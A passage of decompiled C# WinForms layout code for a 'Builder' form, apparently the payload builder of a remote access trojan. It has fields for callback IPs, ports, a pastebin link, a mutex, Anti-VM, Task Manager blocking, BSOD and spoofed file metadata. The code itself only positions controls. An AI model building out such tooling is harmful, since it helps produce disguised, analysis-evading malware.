		this.btnRemoveIP.TabIndex = 72;
		this.btnRemoveIP.Text = "-";
		this.btnRemoveIP.Click += new System.EventHandler(BtnRemoveIP_Click);
		this.btnAddIP.Font = new System.Drawing.Font("Microsoft Sans Serif", 8f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.btnAddIP.Location = new System.Drawing.Point(48, 129);
		this.btnAddIP.Margin = new System.Windows.Forms.Padding(2);
		this.btnAddIP.Name = "btnAddIP";
		this.btnAddIP.Padding = new System.Windows.Forms.Padding(5);
		this.btnAddIP.Size = new System.Drawing.Size(29, 24);
		this.btnAddIP.TabIndex = 71;
		this.btnAddIP.Text = "+";
		this.btnAddIP.Click += new System.EventHandler(BtnAddIP_Click);
		this.textIP.BackColor = System.Drawing.Color.FromArgb(69, 73, 74);
		this.textIP.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
		this.textIP.ForeColor = System.Drawing.Color.FromArgb(220, 220, 220);
		this.textIP.Location = new System.Drawing.Point(48, 12);
		this.textIP.Margin = new System.Windows.Forms.Padding(2);
		this.textIP.Name = "textIP";
		this.textIP.Size = new System.Drawing.Size(109, 20);
		this.textIP.TabIndex = 69;
		this.listBoxIP.BackColor = System.Drawing.Color.FromArgb(69, 73, 74);
		this.listBoxIP.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
		this.listBoxIP.ForeColor = System.Drawing.Color.Gainsboro;
		this.listBoxIP.FormattingEnabled = true;
		this.listBoxIP.Location = new System.Drawing.Point(48, 34);
		this.listBoxIP.Margin = new System.Windows.Forms.Padding(2);
		this.listBoxIP.Name = "listBoxIP";
		this.listBoxIP.Size = new System.Drawing.Size(109, 80);
		this.listBoxIP.TabIndex = 70;
		this.label2.AutoSize = true;
		this.label2.ForeColor = System.Drawing.Color.FromArgb(220, 220, 220);
		this.label2.Location = new System.Drawing.Point(178, 15);
		this.label2.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
		this.label2.Name = "label2";
		this.label2.Size = new System.Drawing.Size(26, 13);
		this.label2.TabIndex = 61;
		this.label2.Text = "Port";
		this.textPort.BackColor = System.Drawing.Color.FromArgb(69, 73, 74);
		this.textPort.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
		this.textPort.ForeColor = System.Drawing.Color.FromArgb(220, 220, 220);
		this.textPort.Location = new System.Drawing.Point(214, 13);
		this.textPort.Margin = new System.Windows.Forms.Padding(2);
		this.textPort.Name = "textPort";
		this.textPort.Size = new System.Drawing.Size(109, 20);
		this.textPort.TabIndex = 62;
		this.label1.AutoSize = true;
		this.label1.ForeColor = System.Drawing.Color.FromArgb(220, 220, 220);
		this.label1.Location = new System.Drawing.Point(12, 14);
		this.label1.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
		this.label1.Name = "label1";
		this.label1.Size = new System.Drawing.Size(17, 13);
		this.label1.TabIndex = 68;
		this.label1.Text = "IP";
		this.btnRemovePort.Font = new System.Drawing.Font("Microsoft Sans Serif", 8f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.btnRemovePort.Location = new System.Drawing.Point(293, 132);
		this.btnRemovePort.Margin = new System.Windows.Forms.Padding(2);
		this.btnRemovePort.Name = "btnRemovePort";
		this.btnRemovePort.Padding = new System.Windows.Forms.Padding(5);
		this.btnRemovePort.Size = new System.Drawing.Size(29, 26);
		this.btnRemovePort.TabIndex = 67;
		this.btnRemovePort.Text = "-";
		this.btnRemovePort.Click += new System.EventHandler(BtnRemovePort_Click);
		this.btnAddPort.Font = new System.Drawing.Font("Microsoft Sans Serif", 8f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.btnAddPort.Location = new System.Drawing.Point(214, 132);
		this.btnAddPort.Margin = new System.Windows.Forms.Padding(2);
		this.btnAddPort.Name = "btnAddPort";
		this.btnAddPort.Padding = new System.Windows.Forms.Padding(5);
		this.btnAddPort.Size = new System.Drawing.Size(29, 24);
		this.btnAddPort.TabIndex = 66;
		this.btnAddPort.Text = "+";
		this.btnAddPort.Click += new System.EventHandler(BtnAddPort_Click);
		this.chkPaste_bin.AutoSize = true;
		this.chkPaste_bin.Location = new System.Drawing.Point(17, 176);
		this.chkPaste_bin.Margin = new System.Windows.Forms.Padding(2);
		this.chkPaste_bin.Name = "chkPaste_bin";
		this.chkPaste_bin.Size = new System.Drawing.Size(87, 17);
		this.chkPaste_bin.TabIndex = 64;
		this.chkPaste_bin.Text = "Get ip by link";
		this.chkPaste_bin.CheckedChanged += new System.EventHandler(CheckBox2_CheckedChanged);
		this.listBoxPort.BackColor = System.Drawing.Color.FromArgb(69, 73, 74);
		this.listBoxPort.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
		this.listBoxPort.ForeColor = System.Drawing.Color.Gainsboro;
		this.listBoxPort.FormattingEnabled = true;
		this.listBoxPort.Location = new System.Drawing.Point(214, 34);
		this.listBoxPort.Margin = new System.Windows.Forms.Padding(2, 0, 2, 2);
		this.listBoxPort.Name = "listBoxPort";
		this.listBoxPort.Size = new System.Drawing.Size(109, 80);
		this.listBoxPort.TabIndex = 65;
		this.txtGroup.BackColor = System.Drawing.Color.FromArgb(69, 73, 74);
		this.txtGroup.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
		this.txtGroup.DataBindings.Add(new System.Windows.Forms.Binding("Text", Server.Properties.Settings.Default, "Group", true, System.Windows.Forms.DataSourceUpdateMode.OnPropertyChanged));
		this.txtGroup.ForeColor = System.Drawing.Color.FromArgb(220, 220, 220);
		this.txtGroup.Location = new System.Drawing.Point(262, 206);
		this.txtGroup.Margin = new System.Windows.Forms.Padding(2);
		this.txtGroup.Name = "txtGroup";
		this.txtGroup.Size = new System.Drawing.Size(110, 20);
		this.txtGroup.TabIndex = 110;
		this.txtGroup.Text = Server.Properties.Settings.Default.Group;
		this.txtMutex.BackColor = System.Drawing.Color.FromArgb(69, 73, 74);
		this.txtMutex.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
		this.txtMutex.DataBindings.Add(new System.Windows.Forms.Binding("Text", Server.Properties.Settings.Default, "Mutex", true, System.Windows.Forms.DataSourceUpdateMode.OnPropertyChanged));
		this.txtMutex.ForeColor = System.Drawing.Color.FromArgb(220, 220, 220);
		this.txtMutex.Location = new System.Drawing.Point(262, 263);
		this.txtMutex.Margin = new System.Windows.Forms.Padding(2);
		this.txtMutex.Name = "txtMutex";
		this.txtMutex.Size = new System.Drawing.Size(205, 20);
		this.txtMutex.TabIndex = 104;
		this.txtMutex.Text = Server.Properties.Settings.Default.Mutex;
		this.textFilename.BackColor = System.Drawing.Color.FromArgb(69, 73, 74);
		this.textFilename.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
		this.textFilename.DataBindings.Add(new System.Windows.Forms.Binding("Text", Server.Properties.Settings.Default, "Filename", true, System.Windows.Forms.DataSourceUpdateMode.OnPropertyChanged));
		this.textFilename.Enabled = false;
		this.textFilename.ForeColor = System.Drawing.Color.FromArgb(220, 220, 220);
		this.textFilename.Location = new System.Drawing.Point(549, 302);
		this.textFilename.Margin = new System.Windows.Forms.Padding(2);
		this.textFilename.Name = "textFilename";
		this.textFilename.Size = new System.Drawing.Size(203, 20);
		this.textFilename.TabIndex = 99;
		this.textFilename.Text = Server.Properties.Settings.Default.Filename;
		this.txtFileVersion.BackColor = System.Drawing.Color.FromArgb(69, 73, 74);
		this.txtFileVersion.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
		this.txtFileVersion.DataBindings.Add(new System.Windows.Forms.Binding("Text", Server.Properties.Settings.Default, "txtFileVersion", true, System.Windows.Forms.DataSourceUpdateMode.OnPropertyChanged));
		this.txtFileVersion.Enabled = false;
		this.txtFileVersion.ForeColor = System.Drawing.Color.FromArgb(220, 220, 220);
		this.txtFileVersion.Location = new System.Drawing.Point(601, 238);
		this.txtFileVersion.Margin = new System.Windows.Forms.Padding(2);
		this.txtFileVersion.Name = "txtFileVersion";
		this.txtFileVersion.Size = new System.Drawing.Size(151, 20);
		this.txtFileVersion.TabIndex = 88;
		this.txtFileVersion.Text = Server.Properties.Settings.Default.txtFileVersion;
		this.txtProductVersion.BackColor = System.Drawing.Color.FromArgb(69, 73, 74);
		this.txtProductVersion.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
		this.txtProductVersion.DataBindings.Add(new System.Windows.Forms.Binding("Text", Server.Properties.Settings.Default, "txtProductVersion", true, System.Windows.Forms.DataSourceUpdateMode.OnPropertyChanged));
		this.txtProductVersion.Enabled = false;
		this.txtProductVersion.ForeColor = System.Drawing.Color.FromArgb(220, 220, 220);
		this.txtProductVersion.Location = new System.Drawing.Point(601, 211);
		this.txtProductVersion.Margin = new System.Windows.Forms.Padding(2);
		this.txtProductVersion.Name = "txtProductVersion";
		this.txtProductVersion.Size = new System.Drawing.Size(151, 20);
		this.txtProductVersion.TabIndex = 87;
		this.txtProductVersion.Text = Server.Properties.Settings.Default.txtProductVersion;
		this.txtOriginalFilename.BackColor = System.Drawing.Color.FromArgb(69, 73, 74);
		this.txtOriginalFilename.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
		this.txtOriginalFilename.DataBindings.Add(new System.Windows.Forms.Binding("Text", Server.Properties.Settings.Default, "txtOriginalFilename", true, System.Windows.Forms.DataSourceUpdateMode.OnPropertyChanged));
		this.txtOriginalFilename.Enabled = false;
		this.txtOriginalFilename.ForeColor = System.Drawing.Color.FromArgb(220, 220, 220);
		this.txtOriginalFilename.Location = new System.Drawing.Point(601, 183);
		this.txtOriginalFilename.Margin = new System.Windows.Forms.Padding(2);
		this.txtOriginalFilename.Name = "txtOriginalFilename";
		this.txtOriginalFilename.Size = new System.Drawing.Size(151, 20);
		this.txtOriginalFilename.TabIndex = 86;
		this.txtOriginalFilename.Text = Server.Properties.Settings.Default.txtOriginalFilename;
		this.txtTrademarks.BackColor = System.Drawing.Color.FromArgb(69, 73, 74);
		this.txtTrademarks.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
		this.txtTrademarks.DataBindings.Add(new System.Windows.Forms.Binding("Text", Server.Properties.Settings.Default, "txtTrademarks", true, System.Windows.Forms.DataSourceUpdateMode.OnPropertyChanged));
		this.txtTrademarks.Enabled = false;
		this.txtTrademarks.ForeColor = System.Drawing.Color.FromArgb(220, 220, 220);
		this.txtTrademarks.Location = new System.Drawing.Point(601, 156);
		this.txtTrademarks.Margin = new System.Windows.Forms.Padding(2);
		this.txtTrademarks.Name = "txtTrademarks";
		this.txtTrademarks.Size = new System.Drawing.Size(151, 20);
		this.txtTrademarks.TabIndex = 85;
		this.txtTrademarks.Text = Server.Properties.Settings.Default.txtTrademarks;
		this.txtCopyright.BackColor = System.Drawing.Color.FromArgb(69, 73, 74);
		this.txtCopyright.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
		this.txtCopyright.DataBindings.Add(new System.Windows.Forms.Binding("Text", Server.Properties.Settings.Default, "txtCopyright", true, System.Windows.Forms.DataSourceUpdateMode.OnPropertyChanged));
		this.txtCopyright.Enabled = false;
		this.txtCopyright.ForeColor = System.Drawing.Color.FromArgb(220, 220, 220);
		this.txtCopyright.Location = new System.Drawing.Point(601, 129);
		this.txtCopyright.Margin = new System.Windows.Forms.Padding(2);
		this.txtCopyright.Name = "txtCopyright";
		this.txtCopyright.Size = new System.Drawing.Size(151, 20);
		this.txtCopyright.TabIndex = 84;
		this.txtCopyright.Text = Server.Properties.Settings.Default.txtCopyright;
		this.txtCompany.BackColor = System.Drawing.Color.FromArgb(69, 73, 74);
		this.txtCompany.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
		this.txtCompany.DataBindings.Add(new System.Windows.Forms.Binding("Text", Server.Properties.Settings.Default, "txtCompany", true, System.Windows.Forms.DataSourceUpdateMode.OnPropertyChanged));
		this.txtCompany.Enabled = false;
		this.txtCompany.ForeColor = System.Drawing.Color.FromArgb(220, 220, 220);
		this.txtCompany.Location = new System.Drawing.Point(601, 102);
		this.txtCompany.Margin = new System.Windows.Forms.Padding(2);
		this.txtCompany.Name = "txtCompany";
		this.txtCompany.Size = new System.Drawing.Size(151, 20);
		this.txtCompany.TabIndex = 83;
		this.txtCompany.Text = Server.Properties.Settings.Default.txtCompany;
		this.txtDescription.BackColor = System.Drawing.Color.FromArgb(69, 73, 74);
		this.txtDescription.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
		this.txtDescription.DataBindings.Add(new System.Windows.Forms.Binding("Text", Server.Properties.Settings.Default, "txtDescription", true, System.Windows.Forms.DataSourceUpdateMode.OnPropertyChanged));
		this.txtDescription.Enabled = false;
		this.txtDescription.ForeColor = System.Drawing.Color.FromArgb(220, 220, 220);
		this.txtDescription.Location = new System.Drawing.Point(601, 75);
		this.txtDescription.Margin = new System.Windows.Forms.Padding(2);
		this.txtDescription.Name = "txtDescription";
		this.txtDescription.Size = new System.Drawing.Size(151, 20);
		this.txtDescription.TabIndex = 76;
		this.txtDescription.Text = Server.Properties.Settings.Default.txtDescription;
		this.txtProduct.BackColor = System.Drawing.Color.FromArgb(69, 73, 74);
		this.txtProduct.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
		this.txtProduct.DataBindings.Add(new System.Windows.Forms.Binding("Text", Server.Properties.Settings.Default, "ProductName", true, System.Windows.Forms.DataSourceUpdateMode.OnPropertyChanged));
		this.txtProduct.Enabled = false;
		this.txtProduct.ForeColor = System.Drawing.Color.FromArgb(220, 220, 220);
		this.txtProduct.Location = new System.Drawing.Point(601, 47);
		this.txtProduct.Margin = new System.Windows.Forms.Padding(2);
		this.txtProduct.Name = "txtProduct";
		this.txtProduct.Size = new System.Drawing.Size(151, 20);
		this.txtProduct.TabIndex = 74;
		this.txtProduct.Text = Server.Properties.Settings.Default.ProductName;
		this.txtPaste_bin.BackColor = System.Drawing.Color.FromArgb(69, 73, 74);
		this.txtPaste_bin.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
		this.txtPaste_bin.DataBindings.Add(new System.Windows.Forms.Binding("Text", Server.Properties.Settings.Default, "Paste_bin", true, System.Windows.Forms.DataSourceUpdateMode.OnPropertyChanged));
		this.txtPaste_bin.Enabled = false;
		this.txtPaste_bin.ForeColor = System.Drawing.Color.FromArgb(220, 220, 220);
		this.txtPaste_bin.Location = new System.Drawing.Point(17, 206);
		this.txtPaste_bin.Margin = new System.Windows.Forms.Padding(2);
		this.txtPaste_bin.Name = "txtPaste_bin";
		this.txtPaste_bin.Size = new System.Drawing.Size(140, 20);
		this.txtPaste_bin.TabIndex = 63;
		this.txtPaste_bin.Text = Server.Properties.Settings.Default.Paste_bin;
		this.chkAnti.AutoSize = true;
		this.chkAnti.Location = new System.Drawing.Point(262, 314);
		this.chkAnti.Name = "chkAnti";
		this.chkAnti.Size = new System.Drawing.Size(63, 17);
		this.chkAnti.TabIndex = 111;
		this.chkAnti.Text = "Anti-VM";
		this.chkAntiProcess.AutoSize = true;
		this.chkAntiProcess.Location = new System.Drawing.Point(359, 315);
		this.chkAntiProcess.Name = "chkAntiProcess";
		this.chkAntiProcess.Size = new System.Drawing.Size(93, 17);
		this.chkAntiProcess.TabIndex = 112;
		this.chkAntiProcess.Text = "Block taskmgr";
		base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		base.ClientSize = new System.Drawing.Size(768, 437);
		base.Controls.Add(this.chkAntiProcess);
		base.Controls.Add(this.chkAnti);
		base.Controls.Add(this.txtGroup);
		base.Controls.Add(this.label17);
		base.Controls.Add(this.numDelay);
		base.Controls.Add(this.label16);
		base.Controls.Add(this.chkBsod);
		base.Controls.Add(this.txtMutex);
		base.Controls.Add(this.label5);
		base.Controls.Add(this.comboBoxFolder);
		base.Controls.Add(this.checkBox1);
		base.Controls.Add(this.textFilename);
		base.Controls.Add(this.label3);
		base.Controls.Add(this.label4);
		base.Controls.Add(this.btnBuild);
		base.Controls.Add(this.chkIcon);
		base.Controls.Add(this.txtIcon);
		base.Controls.Add(this.btnIcon);
		base.Controls.Add(this.picIcon);
		base.Controls.Add(this.btnClone);
		base.Controls.Add(this.btnAssembly);
		base.Controls.Add(this.txtFileVersion);
		base.Controls.Add(this.txtProductVersion);
		base.Controls.Add(this.txtOriginalFilename);
		base.Controls.Add(this.txtTrademarks);
		base.Controls.Add(this.txtCopyright);
		base.Controls.Add(this.txtCompany);
		base.Controls.Add(this.label14);
		base.Controls.Add(this.label13);
		base.Controls.Add(this.label12);
		base.Controls.Add(this.label11);
		base.Controls.Add(this.label10);
		base.Controls.Add(this.label9);
		base.Controls.Add(this.txtDescription);
		base.Controls.Add(this.label7);
		base.Controls.Add(this.txtProduct);
		base.Controls.Add(this.label8);
		base.Controls.Add(this.btnRemoveIP);
		base.Controls.Add(this.btnAddIP);
		base.Controls.Add(this.textIP);
		base.Controls.Add(this.listBoxIP);
		base.Controls.Add(this.label2);
		base.Controls.Add(this.textPort);
		base.Controls.Add(this.label1);
		base.Controls.Add(this.btnRemovePort);
		base.Controls.Add(this.txtPaste_bin);
		base.Controls.Add(this.btnAddPort);
		base.Controls.Add(this.chkPaste_bin);
		base.Controls.Add(this.listBoxPort);
		base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedSingle;
		base.Margin = new System.Windows.Forms.Padding(2);
		base.Name = "FormBuilder";
		base.ShowIcon = false;
		base.StartPosition = System.Windows.Forms.FormStartPosition.CenterParent;
		this.Text = "Builder";
		base.Load += new System.EventHandler(Builder_Load);
		((System.ComponentModel.ISupportInitialize)this.numDelay).EndInit();
		((System.ComponentModel.ISupportInitialize)this.picIcon).EndInit();
		base.ResumeLayout(false);
		base.PerformLayout();
	}
}
